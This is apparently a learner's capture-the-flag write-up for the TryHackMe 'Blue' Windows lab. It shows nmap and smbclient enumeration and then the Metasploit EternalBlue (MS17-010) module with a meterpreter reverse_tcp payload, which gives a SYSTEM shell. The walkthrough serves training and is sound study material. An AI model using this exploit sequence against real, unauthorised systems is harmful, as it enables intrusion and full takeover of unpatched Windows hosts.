
# TryHackMe: Blue (Windows)

## Info
- Difficulty: Easy
- IP Address: [Target IP]
- Date Completed: [23/04/2025]

---

## 1. Reconnaissance

**Command Used:**
```bash
nmap -sC -sV -oN blue_scan.txt [Target IP]
```

**Findings:**
- Port 445 open (SMB)
- Vulnerable to EternalBlue (MS17-010)

---

## 2. Enumeration

**Tool Used:**
```bash
smbclient -L //[Target IP]
```
- Found anonymous share access
- Used `nmap` script to confirm MS17-010 vulnerability

---

## 3. Exploitation

**Method:**
- Used Metasploit Framework
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [Target IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

**Success:**
- Got reverse shell with meterpreter
- Confirmed user access

---

## 4. Privilege Escalation

**Commands:**
```bash
getuid
sysinfo
```

- Already running as SYSTEM (exploit gave NT AUTHORITY\SYSTEM)

---

## 5. Flags

- `user.txt`: [flag]
- `root.txt`: [flag]

---

## 6. What I Learned

- How SMB vulnerabilities like EternalBlue are exploited
- Basics of using Metasploit and meterpreter
- Importance of keeping Windows systems updated
